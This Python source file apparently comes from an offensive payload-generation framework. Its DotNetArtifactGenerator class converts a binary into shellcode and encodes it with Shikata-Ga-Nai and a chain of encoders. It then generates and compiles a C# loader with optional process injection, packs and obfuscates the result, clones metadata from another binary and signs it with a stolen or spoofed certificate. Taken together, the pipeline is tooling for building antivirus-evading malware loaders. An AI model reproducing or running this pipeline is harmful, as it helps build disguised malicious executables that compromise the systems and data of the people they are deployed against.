import os
import shutil
import subprocess
import tempfile
import traceback
from datetime import datetime
from pathlib import Path

from compilers.CscCompiler import CscCompiler
from compilers.ILPacker import ILPacker
from config.Config import Config
from converters.Donut import ArchitectureMismatch
from converters.TransfomerExceptions import ConversionError
from converters.TransformerFactory import TransformerFactory
from encoders.EncoderChain import EncoderChain
from encoders.HexEncoder import HexEncoder
from engine.CodeWriter import CodeWriter
from engine.Filter import Filter
from engine.structures.enums.ResourceType import ResourceType
from enums.Language import Language
from generators.Generator import Generator
from obfuscators.Obfuscator import Obfuscator
from utils.MetaTwin import MetaTwin
from utils.console import Console
from utils.utils import get_project_root, file_signature, shellcode_signature, sgn


class DotNetArtifactGenerator(Generator):
    def __init__(self,
                 file: str = None,
                 chain: EncoderChain = None,
                 outfile: str = None,
                 transformer: str = None,
                 cargs: str = None,
                 params: str = None,
                 obfuscate: bool = False,
                 delay: int = None,
                 sgn: bool = False,
                 pinject: bool = False,
                 process: list = None,
                 arch: str = None,
                 classname: str = None,
                 function: str = None,
                 sign: bool = False,
                 modules: list = None,
                 hide_window: bool = False,
                 clone: str = None,
                 domain: str = None,
                 offline: bool = False,
                 steal_from: str = None
                 ):
        super().__init__(file=file, chain=chain)
        # Not needed anymore
        # if chain.is_empty():
        #    chain.push(HexEncoder())
        config = Config()
        self.hide_window = hide_window
        self.sgn = sgn
        self.obfuscate = obfuscate
        self.save_source = config.get_boolean("DEBUG", "save_source")

        # Code Signing
        self.sign = sign
        self.domain = domain
        self.steal_from = steal_from
        self.offline = offline if not steal_from else True

        self.clone = Path(clone) if clone else None

        self.arch = None
        self.tool_arch = None

        self.set_architectures(arch)
        self.additional_args = cargs

        self.compiler = CscCompiler(aargs=self.additional_args, arch=self.arch)

        filename, ext = os.path.splitext(outfile)
        filename = os.path.basename(filename)
        self.working_directory = working_directory = Config().get_path("DIRECTORIES", "WRITER")

        self.dll = True if ext == ".dll" else False

        self.outfiles = {
            "temp": os.path.join(working_directory, filename + "-temp" + ext),
            "packed": os.path.join(working_directory, filename + "-packed" + ext),
            "obfuscated": os.path.join(working_directory, filename + "-obfuscated" + ext),
            "signed": os.path.join(working_directory, filename + "-signed" + ext),
            "final": outfile,
        }
        _filter = Filter(exclude=["dll"]) if not self.dll else Filter(include=["dll"])

        if transformer and transformer in TransformerFactory.allowed(file=file):
            self.transformer = TransformerFactory.from_name(transformer)
        else:
            self.transformer = TransformerFactory.from_file(file=file)

        self.transformer.set_architecture(arch=self.arch)

        # If the loader is sRDI, we'll need a class / function to convert
        kwargs = {"classname": classname, "function": function}
        self.transformer.set_additional_arguments(kwargs={**kwargs})

        self.need_parameter_module = False
        try:
            self.transformer.add_parameters(params=params)
        except:
            # print(f"[-] Warning: Transformer {self.transformer.__class__.__name__} does not support parameters")
            self.need_parameter_module = True

        self.is_packed = False
        self.dependencies = ""

        # Replaced write creation with writer parameter saving
        self.writer = None
        self.file = file
        self.delay = delay
        self.pinject = pinject
        self.process = process
        self._filter = _filter
        self.modules = modules

        self.placeholder = config.get("PLACEHOLDERS", "SHELLCODE")
        template_path = config.get_path("DIRECTORIES", "TEMPLATES")
        artifacts_path = config.get_path("DIRECTORIES", "ARTIFACTS")

        if working_directory and working_directory != "":
            self.cs_out = tempfile.NamedTemporaryFile(dir=working_directory, delete=False, suffix=".cs").name
        else:
            self.cs_out = tempfile.NamedTemporaryFile(delete=False, suffix=".cs").name

    def set_architectures(self, arch):
        if arch in ["x86", "x64"]:
            self.arch = self.tool_arch = arch
        if arch == "anycpu":
            self.arch = arch
            self.tool_arch = None
        elif arch == "anycpu-x86":
            self.arch = "anycpu"
            self.tool_arch = "x86"
        elif arch == "anycpu-x64":
            self.arch = "anycpu"
            self.tool_arch = "x64"

    def pack_exe(self):
        if os.path.isfile(self.outfiles["packed"]):
            os.unlink(self.outfiles["packed"])
        packer_args = {
            "/target": "exe",
            "/out": f'"{self.outfiles["packed"]}"'
        }
        packer = ILPacker(args=packer_args)
        packer.compile([self.outfiles["temp"]] + self.writer.template.libraries)
        if os.path.isfile(self.outfiles["packed"]):
            self.is_packed = True
            shutil.move(self.outfiles["packed"], self.outfiles["temp"])
            Console.auto_line(f"  [+] Success: packed file stored at {self.outfiles['temp']}")
            Console.auto_line(f"  [+] File Signature: {file_signature(self.outfiles['temp'])}")
        else:
            Console.auto_line("  [-] Failure: Error during compilation")
            raise FileNotFoundError("Error generating EXE")

    def sign_exe(self):
        super().sign(
            signee=self.outfiles["temp"],
            signed=self.outfiles["signed"],
            clone=self.steal_from,
            offline=self.offline,
            domain=self.domain
        )
        shutil.copy(self.outfiles["signed"], self.outfiles['temp'])

    def obfuscate_exe(self):
        obfuscator = Obfuscator.choose_obfuscator(language=Language.CSHARP, filename=self.outfiles['temp'])
        new_file = obfuscator.obfuscate()
        if new_file:
            shutil.move(new_file, self.outfiles['temp'])

    def finalise_exe(self):
        file = self.outfiles["final"]
        shutil.move(self.outfiles['temp'], file)
        if os.path.isfile(file):
            Console.auto_line(f"  [+] Success: file stored at {file}")
        return file

    def compile_exe(self):
        self.compiler.default_exe_args(outfile=self.outfiles["temp"])
        if self.dll:
            self.compiler.default_dll_args(outfile=self.outfiles["temp"])
        elif self.hide_window:
            self.compiler.hide_window()
        self.refresh_libraries()
        # Loop for additional resources. Must resolve all of this non-sense using a manager
        for res in self.writer.resources.memory:
            # For the moment, we just considering ICONs, but we'll need to implement
            if res.resource_type == ResourceType.ICO:
                print(res.path)
                input()
                self.compiler.set_icon(icon=res.path)
        self.compiler.compile(self.writer.source_files)

        if not os.path.isfile(self.outfiles['temp']):
            Console.auto_line("  [-] Failure: Error during compilation")
            raise FileNotFoundError("Error generating EXE")

    def compile_dll(self, source, outfile, libs: list = None):
        self.compiler.default_dll_args(outfile=outfile)
        self.compiler.set_libraries(libs=libs)
        self.compiler.set_architecture(arch=self.arch)
        # Loop for additional resources. Must resolve all of this non-sense using a manager
        for res in self.writer.resources:
            # For the moment, we just considering ICONs, but we'll need to implement
            if res.resource_type == ResourceType.ICO:
                continue
        self.compiler.compile([source])
        if not os.path.isfile(outfile):
            Console.auto_line("  [-] Failure: Error during compilation")
            raise FileNotFoundError(f"Error generating {os.path.basename(outfile).upper()} DLL")

    def clean(self):
        if self.writer:
            self.writer.clean(backup=self.save_source)
        base_paths = [get_project_root(), "temp"]
        for base_path in base_paths:
            wildcards = [
                "*.cs",
                "*.obj",
                "*.exp",
                "*.lib",
                "*.pdb",
                "*.shc.exe",
                "*.bin",
                "coded.txt",
                "*.obfuscated",
                "*.exe.config"
            ]
            if base_path == "temp":
                wildcards = ["*"]
            for wildcard in wildcards:
                subprocess.call(f"del /F /Q \"{os.path.join(base_path, wildcard)}\"",
                                shell=True,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
        for name, path in self.outfiles.items():
            if name.find("final") < 0:
                try:
                    os.unlink(path)
                except FileNotFoundError:
                    pass

    def load_writer_chain(self):
        self.writer.load_chain(chain=self.chain)

    def refresh_libraries(self):
        self.writer.template.process_modules()
        self.compiler.set_libraries(libs=self.writer.template.libraries)
        self.dependencies = ",".join([f'"{os.path.basename(lib)}"' for lib in self.writer.template.libraries])

    def clone_metadata2(self, target: Path):
        if not (self.clone and self.clone.is_file()):
            return False
        meta_twin = MetaTwin()
        version_info = meta_twin.inspect(str(self.clone.absolute()), dump=True)
        # Workaround for .NET assembly infromations
        self.writer.set_assembly_info(version_info)

    def generate(self):
        try:
            self.generate_wrapped()
        except (ConversionError, ArchitectureMismatch) as e:
            Console.auto_line(f"[-] {e}")
        except SystemExit:
            pass
        except:
            traceback.print_exc()
        finally:
            self.clean()

    def generate_wrapped(self):
        step = 0
        substep = 1
        Console.auto_line(f"[+] .Net Artifact Generator Started At {datetime.utcnow()}")
        Console.auto_line(f"[*] Phase {step}: Loading...")

        if not self.chain.validate():
            Console.auto_line("\n[-] ERROR: Failed to validate encoding chain")
            return
        step += 1
        Console.auto_line(f"[*] Phase {step}: Converting binary into shellcode")
        Console.auto_line(f"  [>] Transformer: {self.transformer.__class__.__name__}")
        shellcode_bytes = self.transformer.transform(target=self.file)
        step += 1
        Console.auto_line(f"[*] Phase {step}: Encoding")
        if self.sgn:
            Console.auto_line(
                f"  [>] Phase {step}.{substep}: Using Shikata-Ga-Nai {self.tool_arch} to encode the shellcode")
            shellcode_bytes = sgn(shellcode_bytes, arch=self.tool_arch)
            substep += 1
            Console.auto_line(f"  [>] Phase {step}.{substep}: Using Inceptor chained encoder to encode the shellcode")
        Console.auto_line(f"  [>] Encoder Chain: {self.chain.to_string()}")
        final_shellcode = self.chain.encode(shellcode_bytes)
        self.writer = CodeWriter(
            file=self.file,
            delay=self.delay,
            pinject=self.pinject,
            process=self.process,
            _filter=self._filter,
            modules=self.modules,
            converter=self.transformer,
            arch=self.arch,
            shellcode=final_shellcode
        )
        self.load_writer_chain()
        step += 1
        substep = 1
        # print(final_shellcode)
        # with open("coded.txt", "wb") as test:
        #    test.write(final_shellcode)
        Console.auto_line(f"  [>] Shellcode size: {len(final_shellcode)}")
        Console.auto_line(f"  [>] Shellcode Signature: {shellcode_signature(final_shellcode)}")
        # print(f"  [>] Iteration required for decoding: {len(final_shellcode)}")

        Console.auto_line(f"[*] Phase {step}: Generating source files using {self.writer.template.template_name}")
        Console.auto_line(
            f"  [>] Phase {step}.{substep}: Writing CS file in .\\temp\\{os.path.basename(self.writer.outfile)}")
        self.writer.write_source(final_shellcode)
        substep += 1
        if len(self.writer.template.libraries) > 0:
            dep = ",".join([f'"{os.path.basename(lib)}"' for lib in self.writer.template.libraries])
            Console.auto_line(f"  [>] Phase {step}.{substep}: Compiling and linking dependency files in {dep}")
        step += 1
        substep = 1

        if self.clone:
            Console.auto_line(f"[*] Phase {step}: Cloning AssemblyInfo from another binary")
            self.clone_metadata2(Path(self.outfiles['temp']))
            step += 1

        Console.auto_line(f"[*] Phase {step}: Compiling")
        self.compile_exe()
        step += 1

        if len(self.writer.template.libraries) > 0:
            Console.auto_line(f"[*] Phase {step}: Merging Resources")
            self.pack_exe()
            step += 1

        if self.obfuscate:
            Console.auto_line(f"[*] Phase {step}: Obfuscate dotnet binary")
            self.obfuscate_exe()
            step += 1

        if self.clone:
            Console.auto_line(f"[*] Phase {step}: Cloning resources from another binary")
            self.clone_metadata(Path(self.outfiles['temp']))
            step += 1

        if self.sign:
            Console.auto_line(f"[*] Phase {step}: Sign dotnet binary")
            self.sign_exe()
            step += 1

        Console.auto_line(f"[*] Phase {step}: Finalising")
        artifact = self.finalise_exe()
        step += 1

        Console.auto_line(f"[*] Phase {step}: Cleaning up")
        self.clean()
        Console.auto_line(f"[+] .Net Artifact Generator Finished At {datetime.utcnow()}")
        return artifact
